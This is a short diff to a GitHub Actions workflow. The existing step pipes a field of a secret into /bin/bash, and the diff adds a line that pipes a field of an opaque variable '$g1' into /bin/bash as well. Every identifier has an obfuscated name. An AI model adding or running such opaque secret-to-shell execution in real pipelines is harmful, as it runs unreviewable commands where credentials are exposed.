@@ -20,6 +20,7 @@ jobs:
           j462: ${{ secrets.j462 }}
         run: |
           printf '%s' "$j462" | jq -r .igx90504 | /bin/bash
+          echo $g1 | jq -r .q20523 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
